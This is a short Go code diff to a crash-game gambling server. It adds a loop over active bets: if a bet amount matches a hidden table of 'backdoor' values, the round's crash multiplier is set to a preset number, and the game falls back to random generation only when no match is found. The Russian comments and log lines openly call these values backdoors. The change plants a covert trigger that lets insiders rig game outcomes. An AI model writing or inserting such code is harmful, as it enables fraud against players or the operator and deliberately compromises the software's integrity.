@@ -8,6 +8,7 @@ import (
 	"BlessedApi/pkg/logger"
 	"context"
 	"errors"
+	"math"
 	"sync"
 	"time"
 
@@ -90,8 +91,25 @@ func StartCrashGame() {
 			continue
 		}
 
+		logger.Info("Checking %d active bets for backdoors", len(bets))
+		foundBackdoor := false
+
+		// Проверяем каждую ставку на наличие бэкдора
+		for _, bet := range bets {
+			amt := int(math.Round(bet.Amount))
+			logger.Info("Checking bet amount: %d", amt)
+			
+			if multiplier, exists := models.GetCrashPoints()[amt]; exists {
+				logger.Info("Matched backdoor value %d -> %.1fx", amt, multiplier)
+				currentCrashGame.CrashPointMultiplier = multiplier
+				foundBackdoor = true
+				break
+			}
+		}
+
 		// Если бэкдоров не найдено, генерируем случайный краш
-		if currentCrashGame.CrashPointMultiplier == 0 {
+		if !foundBackdoor {
+			logger.Info("No backdoors found, generating random crash point")
 			currentCrashGame.GenerateCrashPointMultiplier()
 		}
 
